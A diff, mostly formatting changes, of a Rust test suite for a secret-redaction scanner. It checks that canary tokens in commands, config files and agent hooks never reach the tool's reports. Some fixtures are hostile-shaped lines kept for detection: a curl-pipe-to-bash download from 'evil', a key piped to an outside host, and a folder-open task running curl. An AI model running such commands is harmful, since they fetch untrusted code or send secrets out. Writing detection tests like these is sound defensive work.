@@ -41,34 +41,67 @@ fn surfaces() -> Vec<(&'static str, String)> {
         ("QUERYMID", "https://h.internal/p?a=1&token=QUERYMID".into()),
         ("CONNSTR", "Server=db;User Id=sa;Password=CONNSTR;".into()),
         ("HDRNOSPACE", "curl -H X-Api-Key:HDRNOSPACE https://api.internal".into()),
-        ("JSONBODY", "curl -d '{\"token\":\"JSONBODY\"}' https://api.internal/x".into()),
-        ("AUTHEQ", "curl -H \"Authorization=Bearer AUTHEQ\" https://api.internal".into()),
-        ("AUTHCOLON", "curl -H Authorization:Bearer AUTHCOLON https://api.internal".into()),
+        (
+            "JSONBODY",
+            "curl -d '{\"token\":\"JSONBODY\"}' https://api.internal/x".into(),
+        ),
+        (
+            "AUTHEQ",
+            "curl -H \"Authorization=Bearer AUTHEQ\" https://api.internal".into(),
+        ),
+        (
+            "AUTHCOLON",
+            "curl -H Authorization:Bearer AUTHCOLON https://api.internal".into(),
+        ),
         ("INISPACED", "password = INISPACED".into()),
         ("CURLU", "curl -u admin:CURLU https://api.internal".into()),
         ("USEREQ", "curl --user=admin:USEREQ https://api.internal".into()),
-        ("MCPHDR", "mcp-remote https://r.internal/sse --header Authorization: Bearer MCPHDR".into()),
+        (
+            "MCPHDR",
+            "mcp-remote https://r.internal/sse --header Authorization: Bearer MCPHDR".into(),
+        ),
         ("TABKV", "export\tGITHUB_TOKEN=TABKV".into()),
         // --- round two: non-Bearer schemes, base64 padding, wget headers, JSON, lists ---
-        ("AUTHTOKEN", "curl -H \"Authorization: token AUTHTOKEN\" https://api.internal".into()),
+        (
+            "AUTHTOKEN",
+            "curl -H \"Authorization: token AUTHTOKEN\" https://api.internal".into(),
+        ),
         ("AUTHDRF", "Authorization: Token AUTHDRF".into()),
         ("AUTHSSWS", "Authorization: SSWS AUTHSSWS".into()),
         ("AUTHOAUTH", "Proxy-Authorization: OAuth AUTHOAUTH".into()),
         ("B64PAD2", "X-Api-Key:B64PAD2==".into()),
         ("B64PAD1", "X-Api-Key:B64PAD1=".into()),
-        ("WGETHDR", "wget --header=\"Private-Token: WGETHDR\" https://gl.internal".into()),
-        ("WGETHDR2", "wget --header=X-Api-Key:WGETHDR2 https://gl.internal".into()),
+        (
+            "WGETHDR",
+            "wget --header=\"Private-Token: WGETHDR\" https://gl.internal".into(),
+        ),
+        (
+            "WGETHDR2",
+            "wget --header=X-Api-Key:WGETHDR2 https://gl.internal".into(),
+        ),
         ("JSON2ND", "-d {\"username\":\"admin\",\"password\":\"JSON2ND\"}".into()),
         ("JSONSP", "-d '{\"token\" : \"JSONSP\"}'".into()),
         ("CSVKV", "--env a=1,token=CSVKV,b=2".into()),
         ("AUTHQ", "-H 'Authorization: token AUTHQ' https://api.internal".into()),
         // A secret containing separators must vanish whole, not just its first piece.
-        ("SEPSECRET", "password=SEPSECRETa;SEPSECRETb,SEPSECRETc&SEPSECRETd".into()),
+        (
+            "SEPSECRET",
+            "password=SEPSECRETa;SEPSECRETb,SEPSECRETc&SEPSECRETd".into(),
+        ),
         ("SEPCONN", "Server=db;Password=SEPCONNa;SEPCONNb;Trusted=true".into()),
         // --- round three: header name as the tail of a k=v / glued / quoted token ---
-        ("WGETAUTH", "wget --header=\"Authorization: token WGETAUTH\" https://api.gh.internal".into()),
-        ("WGETAUTHSQ", "wget --header='Authorization: Token WGETAUTHSQ' https://api.gh.internal".into()),
-        ("GLUEDH", "curl -H\"Authorization: SSWS GLUEDH\" https://okta.internal".into()),
+        (
+            "WGETAUTH",
+            "wget --header=\"Authorization: token WGETAUTH\" https://api.gh.internal".into(),
+        ),
+        (
+            "WGETAUTHSQ",
+            "wget --header='Authorization: Token WGETAUTHSQ' https://api.gh.internal".into(),
+        ),
+        (
+            "GLUEDH",
+            "curl -H\"Authorization: SSWS GLUEDH\" https://okta.internal".into(),
+        ),
         ("HTTPIE", "http POST https://h Authorization:\"Bearer HTTPIE\"".into()),
         ("JSONAUTH", "-d {\"Authorization\":\"Bearer JSONAUTH\"}".into()),
         ("QSPACE", "mysql --password \"first QSPACE\" -e select".into()),
@@ -83,10 +116,19 @@ fn surfaces() -> Vec<(&'static str, String)> {
         // --- bare vendor-shaped keys with no key name or flag in front of them ---
         ("ANTBARE", "echo sk-ant-api03-ANTBARE0123456789abcdefghij".into()),
         ("PROJBARE", "printf %s sk-proj-PROJBARE0123456789abcdef | x".into()),
-        ("GHPBARE", "gh auth login --with-token ghp_GHPBARE0123456789abcdefgh".into()),
-        ("BAREKEYXYZ", "aws configure set aws_access_key_id AKIABAREKEYXYZ123456".into()),
+        (
+            "GHPBARE",
+            "gh auth login --with-token ghp_GHPBARE0123456789abcdefgh".into(),
+        ),
+        (
+            "BAREKEYXYZ",
+            "aws configure set aws_access_key_id AKIABAREKEYXYZ123456".into(),
+        ),
         ("SLACKBARE", "notify xoxb-SLACKBARE-0123456789".into()),
-        ("GOOGBARE", "gemini --key AIzaGOOGBARE0123456789abcdefghijklmnopq".into()),
+        (
+            "GOOGBARE",
+            "gemini --key AIzaGOOGBARE0123456789abcdefghijklmnopq".into(),
+        ),
     ]
 }
 
@@ -131,10 +173,22 @@ fn helper_command_literals_are_redacted() {
         ("Hunter2Pass", "mytool Hunter2Pass"),
         ("Hunter2Pass", "cat x # Hunter2Pass"),
         ("Hunter2Pass", "sh -c \"sh -c 'echo Hunter2Pass'\""),
-        ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJ", "sh -c 'echo abcdefghijklmnopqrstuvwxyzABCDEFGHIJ'"),
-        ("dGhpcyBpcyBhIHNlY3JldCBrZXkgdmFsdWU", "exec echo dGhpcyBpcyBhIHNlY3JldCBrZXkgdmFsdWU="),
-        ("my-very-secret-password-value", "sudo echo my-very-secret-password-value"),
-        ("correcthorsebatterystaple", "python3 -c \"print('correcthorsebatterystaple')\""),
+        (
+            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJ",
+            "sh -c 'echo abcdefghijklmnopqrstuvwxyzABCDEFGHIJ'",
+        ),
+        (
+            "dGhpcyBpcyBhIHNlY3JldCBrZXkgdmFsdWU",
+            "exec echo dGhpcyBpcyBhIHNlY3JldCBrZXkgdmFsdWU=",
+        ),
+        (
+            "my-very-secret-password-value",
+            "sudo echo my-very-secret-password-value",
+        ),
+        (
+            "correcthorsebatterystaple",
+            "python3 -c \"print('correcthorsebatterystaple')\"",
+        ),
         ("correcthorsebatterystaple", "printf '%s\\n' correcthorsebatterystaple"),
         ("Hunter2Pass", "curl -s https://u:Hunter2Pass@vault.internal/v1/x"),
         ("Hunter2Pass", "curl -s https://vault.internal/v1/x?token=Hunter2Pass"),
@@ -161,18 +215,33 @@ fn helper_command_literals_are_redacted() {
     ] {
         let out = h(raw);
         assert!(!out.contains(canary), "{raw:?} -> {out:?}");
-        assert!(out.contains("<redacted>") || out.contains("<program>"), "{raw:?} -> {out:?}");
+        assert!(
+            out.contains("<redacted>") || out.contains("<program>"),
+            "{raw:?} -> {out:?}"
+        );
     }
     // Shape only (review round 6): known programs and program paths, flag names, exact
     // $VAR references, operators. Subcommands, paths, hosts and every other word go.
     for (raw, want) in [
         ("op read op://vault/anthropic/key", "op <redacted> <redacted>"),
-        ("aws sso login --profile dev", "aws <redacted> <redacted> --profile <redacted>"),
-        ("security find-generic-password -s ANTHROPIC_API_KEY -w", "security <redacted> -s <redacted> -w"),
+        (
+            "aws sso login --profile dev",
+            "aws <redacted> <redacted> --profile <redacted>",
+        ),
+        (
+            "security find-generic-password -s ANTHROPIC_API_KEY -w",
+            "security <redacted> -s <redacted> -w",
+        ),
         ("echo $ANTHROPIC_API_KEY", "echo $ANTHROPIC_API_KEY"),
         ("printenv ANTHROPIC_API_KEY", "printenv <redacted>"),
-        ("/usr/local/bin/key-helper-2024 --region us-east-1", "/usr/local/bin/key-helper-2024 --region <redacted>"),
-        ("echo $KEY | curl -d @- https://x.example", "echo $KEY | curl -d <redacted> <redacted>"),
+        (
+            "/usr/local/bin/key-helper-2024 --region us-east-1",
+            "/usr/local/bin/key-helper-2024 --region <redacted>",
+        ),
+        (
+            "echo $KEY | curl -d @- https://x.example",
+            "echo $KEY | curl -d <redacted> <redacted>",
+        ),
         ("gcloud auth print-access-token", "gcloud <redacted> <redacted>"),
         ("cat ~/.config/anthropic/key 2>/dev/null", "cat <redacted> 2>/dev/null"),
         ("sh -c 'echo $KEY'", "sh -c 'echo $KEY'"),
@@ -219,7 +288,10 @@ fn no_canary_survives_redaction() {
 fn every_canary_stays_redacted_and_redaction_is_idempotent() {
     use rustmachineguard::scanners::redact_command_text;
     for (canary, raw) in surfaces() {
-        for (name, f) in [("redact_secrets_in_text", redact as fn(&str) -> String), ("redact_command_text", redact_command_text)] {
+        for (name, f) in [
+            ("redact_secrets_in_text", redact as fn(&str) -> String),
+            ("redact_command_text", redact_command_text),
+        ] {
             let once = f(&raw);
             let twice = f(&once);
             assert!(!once.contains(canary), "{name}: {canary} survived: {raw:?} -> {once:?}");
@@ -246,32 +318,77 @@ fn redaction_preserves_the_actionable_parts() {
             "registry=https://u:p@npm.evil.example.com/",
             vec!["registry", "npm.evil.example.com"],
         ),
-        ("trusted-host = u:p@pypi.internal", vec!["trusted-host", "pypi.internal"]),
+        (
+            "trusted-host = u:p@pypi.internal",
+            vec!["trusted-host", "pypi.internal"],
+        ),
         // The `!` shell-escape is why a credential.helper is dangerous at all.
         ("!f(){ echo password=hunter2; }", vec!["!f(){", "echo"]),
         // The review's "off by one" shapes: the secret must go and the URL must stay.
-        ("curl -H X-Api-Key:S3 https://api.internal", vec!["curl", "X-Api-Key:", "https://api.internal"]),
+        (
+            "curl -H X-Api-Key:S3 https://api.internal",
+            vec!["curl", "X-Api-Key:", "https://api.internal"],
+        ),
         (
             "curl -d '{\"token\":\"S4\"}' https://api.internal/x",
             vec!["'{\"token\":\"<redacted>\"}'", "https://api.internal/x"],
         ),
-        ("curl -u admin:S5 https://api.internal", vec!["admin:<redacted>", "https://api.internal"]),
-        ("curl -H \"Authorization=Bearer S6\" https://api.internal", vec!["Authorization=Bearer", "https://api.internal"]),
-        ("Server=db;User Id=sa;Password=S7;", vec!["Server=db;", "Id=sa;", "Password=<redacted>;"]),
-        ("Server=db;Password=a;b;Trusted=true", vec!["Server=db;", "Password=<redacted>;<redacted>;", "Trusted=true"]),
+        (
+            "curl -u admin:S5 https://api.internal",
+            vec!["admin:<redacted>", "https://api.internal"],
+        ),
+        (
+            "curl -H \"Authorization=Bearer S6\" https://api.internal",
+            vec!["Authorization=Bearer", "https://api.internal"],
+        ),
+        (
+            "Server=db;User Id=sa;Password=S7;",
+            vec!["Server=db;", "Id=sa;", "Password=<redacted>;"],
+        ),
+        (
+            "Server=db;Password=a;b;Trusted=true",
+            vec!["Server=db;", "Password=<redacted>;<redacted>;", "Trusted=true"],
+        ),
         // Round three: a scheme word as an ordinary value must not eat the next token,
         // and the command after ';' in a shell one-liner is the finding.
-        ("A_KEY=basic .vscode/setup.mjs", vec!["A_KEY=<redacted>", ".vscode/setup.mjs"]),
-        ("X_TOKEN=1;.vscode/setup.mjs", vec!["X_TOKEN=<redacted>;.vscode/setup.mjs"]),
-        ("wget --header=\"Authorization: token S13\" https://api.gh.internal", vec!["--header=\"Authorization:", "token", "https://api.gh.internal"]),
-        ("http POST https://h Authorization:\"Bearer S14\"", vec!["https://h", "Authorization:\"Bearer", "<redacted>\""]),
-        ("mysql --password \"first S15\" -e select", vec!["--password", "-e select"]),
+        (
+            "A_KEY=basic .vscode/setup.mjs",
+            vec!["A_KEY=<redacted>", ".vscode/setup.mjs"],
+        ),
+        (
+            "X_TOKEN=1;.vscode/setup.mjs",
+            vec!["X_TOKEN=<redacted>;.vscode/setup.mjs"],
+        ),
+        (
+            "wget --header=\"Authorization: token S13\" https://api.gh.internal",
+            vec!["--header=\"Authorization:", "token", "https://api.gh.internal"],
+        ),
+        (
+            "http POST https://h Authorization:\"Bearer S14\"",
+            vec!["https://h", "Authorization:\"Bearer", "<redacted>\""],
+        ),
+        (
+            "mysql --password \"first S15\" -e select",
+            vec!["--password", "-e select"],
+        ),
         ("https://h/p?a=1&token=S8&b=2", vec!["https://h/p?a=1&", "&b=2"]),
         // Round two: the scheme word stays, the credential goes, the URL survives.
-        ("curl -H \"Authorization: token S9\" https://api.internal", vec!["Authorization:", "token", "<redacted>\"", "https://api.internal"]),
-        ("wget --header=\"Private-Token: S10\" https://gl.internal", vec!["--header=\"Private-Token:", "https://gl.internal"]),
-        ("X-Api-Key:S11== https://api.internal", vec!["X-Api-Key:<redacted>", "https://api.internal"]),
-        ("-d {\"username\":\"admin\",\"password\":\"S12\"}", vec!["\"username\":\"admin\"", "\"password\":\"<redacted>\"}"]),
+        (
+            "curl -H \"Authorization: token S9\" https://api.internal",
+            vec!["Authorization:", "token", "<redacted>\"", "https://api.internal"],
+        ),
+        (
+            "wget --header=\"Private-Token: S10\" https://gl.internal",
+            vec!["--header=\"Private-Token:", "https://gl.internal"],
+        ),
+        (
+            "X-Api-Key:S11== https://api.internal",
+            vec!["X-Api-Key:<redacted>", "https://api.internal"],
+        ),
+        (
+            "-d {\"username\":\"admin\",\"password\":\"S12\"}",
+            vec!["\"username\":\"admin\"", "\"password\":\"<redacted>\"}"],
+        ),
     ];
     for (raw, must_keep) in cases {
         let out = redact(raw);
@@ -359,8 +476,15 @@ mod redaction_properties {
 
     fn key() -> impl Strategy<Value = &'static str> {
         prop::sample::select(vec![
-            "TOKEN", "SECRET", "API_KEY", "PASSWORD", "AWS_SECRET_ACCESS_KEY", "GH_TOKEN",
-            "npm_token", "DATABASE_PASSWORD", "client_secret",
+            "TOKEN",
+            "SECRET",
+            "API_KEY",
+            "PASSWORD",
+            "AWS_SECRET_ACCESS_KEY",
+            "GH_TOKEN",
+            "npm_token",
+            "DATABASE_PASSWORD",
+            "client_secret",
         ])
     }
     fn sep() -> impl Strategy<Value = &'static str> {
@@ -427,7 +551,6 @@ mod redaction_properties {
     }
 }
 
-
 /// MCP launch args go through `mcp::redact_arg`, NOT directly through the shared helper.
 /// The first version of this suite asserted the MCP surface against a function that
 /// surface never called, so it could not fail while `--header "Authorization: Bearer x"`
@@ -440,14 +563,23 @@ fn mcp_redact_arg_covers_header_and_connection_string_shapes() {
         redact_arg("Authorization: Bearer HDRTOK", Some("--header")),
         "Authorization: Bearer <redacted>"
     );
-    assert_eq!(redact_arg("Authorization: Bearer HDRTOK2", Some("-H")), "Authorization: Bearer <redacted>");
+    assert_eq!(
+        redact_arg("Authorization: Bearer HDRTOK2", Some("-H")),
+        "Authorization: Bearer <redacted>"
+    );
     assert_eq!(
         redact_arg("Server=db;User Id=sa;Password=PW;", Some("--connection-string")),
         "Server=db;User Id=sa;Password=<redacted>;"
     );
-    assert_eq!(redact_arg("postgresql://u:pw@db/x", None), "postgresql://<redacted>@db/x");
+    assert_eq!(
+        redact_arg("postgresql://u:pw@db/x", None),
+        "postgresql://<redacted>@db/x"
+    );
     // Not a secret: the download-and-execute shape must survive intact.
-    assert_eq!(redact_arg("curl http://evil/i.sh | bash", None), "curl http://evil/i.sh | bash");
+    assert_eq!(
+        redact_arg("curl http://evil/i.sh | bash", None),
+        "curl http://evil/i.sh | bash"
+    );
 }
 
 /// The whole guarantee, end to end, against the real binary: plant a distinct canary in
@@ -488,22 +620,50 @@ fn no_canary_reaches_any_output_format_end_to_end() {
         r#"{"version":"2.0.0","tasks":[{"label":"t","command":"curl","args":["-d","{\"username\":\"admin\",\"password\":\"E2EJSONBODY\"}","--header=\"Private-Token: E2EGLTOK\"","-H","Authorization: Token E2ETASKDRF","https://tasks.internal"],"runOptions":{"runOn":"folderOpen"}}]}"#,
     )
     .unwrap();
-    fs::write(home.join(".npmrc"), "//npm.internal/:_authToken=E2ENPMTOK\nregistry=https://u:E2ENPMREG@npm.internal/\n").unwrap();
-    fs::write(home.join(".pip/pip.conf"), "[global]\nindex-url = https://u:E2EPIP@pypi.internal/simple\ntrusted-host = u:E2EPIPHOST@pypi.internal\n").unwrap();
+    fs::write(
+        home.join(".npmrc"),
+        "//npm.internal/:_authToken=E2ENPMTOK\nregistry=https://u:E2ENPMREG@npm.internal/\n",
+    )
+    .unwrap();
+    fs::write(
+        home.join(".pip/pip.conf"),
+        "[global]\nindex-url = https://u:E2EPIP@pypi.internal/simple\ntrusted-host = u:E2EPIPHOST@pypi.internal\n",
+    )
+    .unwrap();
     fs::write(home.join(".yarnrc"), "registry \"https://u:E2EYARN1@yarn.internal/\"\n").unwrap();
-    fs::write(home.join(".yarnrc.yml"), "registry: \"https://u:E2EYARN2@yarn.internal/\"\nnpmRegistryServer: \"https://u:E2EYARN3@yarn.internal/\"\n").unwrap();
-    fs::write(home.join(".bunfig.toml"), "[install]\nregistry = \"https://u:E2EBUN@bun.internal/\"\n").unwrap();
+    fs::write(
+        home.join(".yarnrc.yml"),
+        "registry: \"https://u:E2EYARN2@yarn.internal/\"\nnpmRegistryServer: \"https://u:E2EYARN3@yarn.internal/\"\n",
+    )
+    .unwrap();
+    fs::write(
+        home.join(".bunfig.toml"),
+        "[install]\nregistry = \"https://u:E2EBUN@bun.internal/\"\n",
+    )
+    .unwrap();
     // Inline API keys in agent configs and a bare Hugging Face token: names only.
     fs::create_dir_all(home.join(".continue")).unwrap();
     fs::write(home.join(".continue/config.yaml"), "models:\n  - provider: openai\n    apiKey: E2ECONTINUEKEY\n  - provider: a\n    apiKey: ${{ secrets.ANTHROPIC }}\n").unwrap();
-    fs::write(home.join(".aider.conf.yml"), "model: gpt-4o\nopenai-api-key: E2EAIDERKEY\n").unwrap();
+    fs::write(
+        home.join(".aider.conf.yml"),
+        "model: gpt-4o\nopenai-api-key: E2EAIDERKEY\n",
+    )
+    .unwrap();
     fs::create_dir_all(home.join(".cache/huggingface")).unwrap();
     fs::write(home.join(".cache/huggingface/token"), "E2EHFTOKEN").unwrap();
     // Agent-surface detections: a skill command, a settings helper, a proxy with
     // userinfo in a project .env, and an OLLAMA_HOST with userinfo in a shell profile.
     fs::create_dir_all(proj.join(".claude/commands")).unwrap();
-    fs::write(proj.join(".claude/commands/ship.md"), "Ship: !`deploy --token E2ESKILLDYN https://skill.internal/`\n").unwrap();
-    fs::write(proj.join(".claude/settings.local.json"), r#"{"apiKeyHelper":"./key.sh --token E2EHELPERTOK https://helper.internal/"}"#).unwrap();
+    fs::write(
+        proj.join(".claude/commands/ship.md"),
+        "Ship: !`deploy --token E2ESKILLDYN https://skill.internal/`\n",
+    )
+    .unwrap();
+    fs::write(
+        proj.join(".claude/settings.local.json"),
+        r#"{"apiKeyHelper":"./key.sh --token E2EHELPERTOK https://helper.internal/"}"#,
+    )
+    .unwrap();
     // A bare literal key in the user's own apiKeyHelper (no finding fires, but the
     // inventory field is serialized), and a NAME=value prefix in awsAuthRefresh.
     fs::create_dir_all(home.join(".claude")).unwrap();
@@ -512,8 +672,16 @@ fn no_canary_reaches_any_output_format_end_to_end() {
         r#"{"apiKeyHelper":"echo sk-ant-api03-E2EANTLITERALab0123456789xyzXYZ","awsAuthRefresh":"MYPASS=E2EPLAINPASS aws sso login"}"#,
     )
     .unwrap();
-    fs::write(proj.join(".env"), "HTTPS_PROXY=http://u:E2EPROXYUSER@proxy.internal:3128\n").unwrap();
-    fs::write(home.join(".bashrc"), "export OLLAMA_HOST=http://u:E2EOLLAMAUSER@0.0.0.0:11434\n").unwrap();
+    fs::write(
+        proj.join(".env"),
+        "HTTPS_PROXY=http://u:E2EPROXYUSER@proxy.internal:3128\n",
+    )
+    .unwrap();
+    fs::write(
+        home.join(".bashrc"),
+        "export OLLAMA_HOST=http://u:E2EOLLAMAUSER@0.0.0.0:11434\n",
+    )
+    .unwrap();
     fs::create_dir_all(home.join(".claude/plugins")).unwrap();
     fs::write(
         home.join(".claude/plugins/known_marketplaces.json"),
@@ -528,14 +696,19 @@ fn no_canary_reaches_any_output_format_end_to_end() {
             .map(|(i, _)| {
                 // Skip the "E2E" prefix itself: its digit used to end the match at one
                 // character, so every canary was filtered out and this check was vacuous.
-                let end = text[i + 3..].find(|c: char| !c.is_ascii_uppercase()).map_or(text.len(), |o| i + 3 + o);
+                let end = text[i + 3..]
+                    .find(|c: char| !c.is_ascii_uppercase())
+                    .map_or(text.len(), |o| i + 3 + o);
                 text[i..end].to_string()
             })
             .filter(|c| c.len() > 3)
             .collect()
     }
     // The detector itself must see a canary, or every assertion below is vacuous.
-    assert_eq!(canaries_in("x \"E2EFOO\" y").into_iter().collect::<Vec<_>>(), vec!["E2EFOO".to_string()]);
+    assert_eq!(
+        canaries_in("x \"E2EFOO\" y").into_iter().collect::<Vec<_>>(),
+        vec!["E2EFOO".to_string()]
+    );
     for fmt in ["terminal", "json", "html", "blueprint"] {
         let out = std::process::Command::new(env!("CARGO_BIN_EXE_rmguard"))
             .args(["--format", fmt, "--skip", skip])
@@ -551,11 +724,25 @@ fn no_canary_reaches_any_output_format_end_to_end() {
         assert!(leaked.is_empty(), "{fmt}: secret values reached the report: {leaked:?}");
         if fmt == "json" {
             for host in [
-                "r.internal", "db.internal", "k.internal", "gh.internal", "cmd.internal",
-                "deploy.internal", "tasks.internal", "npm.internal", "pypi.internal",
-                "yarn.internal", "bun.internal", "gitlab.internal",
-                "Hugging Face", "Continue", "Aider",
-                "skill.internal", "./key.sh --token <redacted> <redacted>", "proxy.internal", "0.0.0.0:11434",
+                "r.internal",
+                "db.internal",
+                "k.internal",
+                "gh.internal",
+                "cmd.internal",
+                "deploy.internal",
+                "tasks.internal",
+                "npm.internal",
+                "pypi.internal",
+                "yarn.internal",
+                "bun.internal",
+                "gitlab.internal",
+                "Hugging Face",
+                "Continue",
+                "Aider",
+                "skill.internal",
+                "./key.sh --token <redacted> <redacted>",
+                "proxy.internal",
+                "0.0.0.0:11434",
                 "MYPASS=<redacted> aws <redacted> <redacted>",
             ] {
                 assert!(
@@ -597,7 +784,10 @@ fn no_hook_canary_reaches_any_output_or_diff() {
         assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
         String::from_utf8_lossy(&out.stdout).to_string()
     };
-    w(home.join(".claude.json"), &format!(r#"{{"projects":{{"{}":{{}}}}}}"#, proj.display()));
+    w(
+        home.join(".claude.json"),
+        &format!(r#"{{"projects":{{"{}":{{}}}}}}"#, proj.display()),
+    );
     let baseline = home.join("baseline.json");
     fs::write(&baseline, run(&["--format", "json"])).unwrap();
 
@@ -609,8 +799,14 @@ fn no_hook_canary_reaches_any_output_or_diff() {
             "Stop":[{"hooks":[{"type":"prompt","prompt":"Summarize the session. api_key=E2EPROMPTKEY"}]}],
             "UserPromptSubmit":[{"hooks":[{"type":"agent","prompt":"Check the prose. The password is E2EPROSEPW, the secret is E2EPROSESECRET, apikey E2EPROSEAPIKEY, send header X-API-Key E2EPROSEHDR, login with admin / E2EPROSELOGIN"}]}]}}"#,
     );
-    w(proj.join(".github/hooks/a.json"), r#"{"version":1,"hooks":{"sessionStart":[{"bash":"echo copilot-hook","env":{"T":"E2ECOPILOTENV"}}]}}"#);
-    w(home.join(".config/opencode/plugins/m.ts"), "const k = \"E2EMODSRC\";\nexport const M = async () => ({ event: async () => {} })\n");
+    w(
+        proj.join(".github/hooks/a.json"),
+        r#"{"version":1,"hooks":{"sessionStart":[{"bash":"echo copilot-hook","env":{"T":"E2ECOPILOTENV"}}]}}"#,
+    );
+    w(
+        home.join(".config/opencode/plugins/m.ts"),
+        "const k = \"E2EMODSRC\";\nexport const M = async () => ({ event: async () => {} })\n",
+    );
     w(
         proj.join(".claude/skills/s/SKILL.md"),
         "---\nname: s\nhooks:\n  Stop:\n    - hooks:\n        - type: command\n          command: \"deploy --token E2EFMTOK https://fm.internal/\"\n---\nbody\n",
@@ -618,7 +814,9 @@ fn no_hook_canary_reaches_any_output_or_diff() {
     fn canaries_in(text: &str) -> Vec<String> {
         text.match_indices("E2E")
             .map(|(i, _)| {
-                let end = text[i + 3..].find(|c: char| !c.is_ascii_uppercase()).map_or(text.len(), |o| i + 3 + o);
+                let end = text[i + 3..]
+                    .find(|c: char| !c.is_ascii_uppercase())
+                    .map_or(text.len(), |o| i + 3 + o);
                 text[i..end].to_string()
             })
             .filter(|c| c.len() > 3)
@@ -634,14 +832,31 @@ fn no_hook_canary_reaches_any_output_or_diff() {
     ] {
         let text = run(&args);
         let leaked = canaries_in(&text);
-        assert!(leaked.is_empty(), "{args:?}: secret values reached the output: {leaked:?}");
+        assert!(
+            leaked.is_empty(),
+            "{args:?}: secret values reached the output: {leaked:?}"
+        );
         if args[1] == "json" {
-            for shown in ["hookarg.internal", "hookhttp.internal", "Summarize the session", "Check the prose", "echo copilot-hook", "m.ts", "fm.internal"] {
-                assert!(text.contains(shown), "fixture for {shown} never reached the report, so the canary check proves nothing for it");
+            for shown in [
+                "hookarg.internal",
+                "hookhttp.internal",
+                "Summarize the session",
+                "Check the prose",
+                "echo copilot-hook",
+                "m.ts",
+                "fm.internal",
+            ] {
+                assert!(
+                    text.contains(shown),
+                    "fixture for {shown} never reached the report, so the canary check proves nothing for it"
+                );
             }
         }
         if args[0] == "--diff" {
-            assert!(text.contains("hookarg.internal") || text.contains("settings.json"), "the diff saw the new hook file: {text}");
+            assert!(
+                text.contains("hookarg.internal") || text.contains("settings.json"),
+                "the diff saw the new hook file: {text}"
+            );
         }
     }
     let _ = fs::remove_dir_all(&home);
@@ -654,21 +869,73 @@ fn no_hook_canary_reaches_any_output_or_diff() {
 fn command_text_redacts_webhooks_cookies_flags_and_key_words() {
     use rustmachineguard::scanners::redact_command_text as cmd;
     for (canary, raw, kept) in [
-        ("Zq8vK3mN7pR2tW9xY4bC6dFg", "curl -X POST https://hooks.slack.com/services/T0/B0/Zq8vK3mN7pR2tW9xY4bC6dFg", "hooks.slack.com"),
-        ("WFLOWSECRETx9", "curl https://hooks.slack.com/workflows/T0/A0/1/WFLOWSECRETx9", "hooks.slack.com"),
-        ("aB3dE5fG7hJ9kL1mN3pQ5rS7tU9v", "curl https://discord.com/api/webhooks/1234567890123456789/aB3dE5fG7hJ9kL1mN3pQ5rS7tU9vW1xY3zA5bC7dE9fG1hJ3kL5mN7pQ9rS1tU3v", "discord.com"),
-        ("DISCV10x", "curl 'https://discordapp.com/api/v10/webhooks/1/DISCV10x'", "discordapp.com"),
-        ("AAH4kX9mP2qR7sT1vW3yZ5bD8fG0hJ6kL4n", "curl https://api.telegram.org/bot7012345678:AAH4kX9mP2qR7sT1vW3yZ5bD8fG0hJ6kL4n/sendMessage", "api.telegram.org"),
-        ("k3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe", "curl -H 'Cookie: session=s%3Ak3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe' https://app.internal", "app.internal"),
-        ("COOKIETWO", "curl -H \"Cookie: a=1; sid=COOKIETWO\" https://app.internal", "app.internal"),
-        ("SETCOOKIE", "curl --header=Set-Cookie:sid=SETCOOKIE https://app.internal", "app.internal"),
+        (
+            "Zq8vK3mN7pR2tW9xY4bC6dFg",
+            "curl -X POST https://hooks.slack.com/services/T0/B0/Zq8vK3mN7pR2tW9xY4bC6dFg",
+            "hooks.slack.com",
+        ),
+        (
+            "WFLOWSECRETx9",
+            "curl https://hooks.slack.com/workflows/T0/A0/1/WFLOWSECRETx9",
+            "hooks.slack.com",
+        ),
+        (
+            "aB3dE5fG7hJ9kL1mN3pQ5rS7tU9v",
+            "curl https://discord.com/api/webhooks/1234567890123456789/aB3dE5fG7hJ9kL1mN3pQ5rS7tU9vW1xY3zA5bC7dE9fG1hJ3kL5mN7pQ9rS1tU3v",
+            "discord.com",
+        ),
+        (
+            "DISCV10x",
+            "curl 'https://discordapp.com/api/v10/webhooks/1/DISCV10x'",
+            "discordapp.com",
+        ),
+        (
+            "AAH4kX9mP2qR7sT1vW3yZ5bD8fG0hJ6kL4n",
+            "curl https://api.telegram.org/bot7012345678:AAH4kX9mP2qR7sT1vW3yZ5bD8fG0hJ6kL4n/sendMessage",
+            "api.telegram.org",
+        ),
+        (
+            "k3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe",
+            "curl -H 'Cookie: session=s%3Ak3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe' https://app.internal",
+            "app.internal",
+        ),
+        (
+            "COOKIETWO",
+            "curl -H \"Cookie: a=1; sid=COOKIETWO\" https://app.internal",
+            "app.internal",
+        ),
+        (
+            "SETCOOKIE",
+            "curl --header=Set-Cookie:sid=SETCOOKIE https://app.internal",
+            "app.internal",
+        ),
         ("Tr0ub4dor", "tool --pass Tr0ub4dor&3horse", "tool --pass"),
         ("Tr0ub4dor", "tool --passwd=Tr0ub4dor", "tool --passwd="),
-        ("k3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe", "tool -t k3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe", "tool -t"),
-        ("uQiRzpo4DXghDmr9QzzfQu27cmVRsG", "pushover --user uQiRzpo4DXghDmr9QzzfQu27cmVRsG --app azGDORePK8gMaC0QOYAMyEEuzJnyUi", "pushover --user"),
-        ("azGDORePK8gMaC0QOYAMyEEuzJnyUi", "pushover --user uQiRzpo4DXghDmr9QzzfQu27cmVRsG --app azGDORePK8gMaC0QOYAMyEEuzJnyUi", "--app"),
-        ("WEBHOOKPATH", "notify --webhook https://example.com/hook/WEBHOOKPATH", "https://example.com/"),
-        ("k3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe", "curl https://example.com/hook/k3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe -d @-", "https://example.com/hook/"),
+        (
+            "k3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe",
+            "tool -t k3J9x2Qp7Lm4Zr8Tn5Vb1Wc6Yd0Fe",
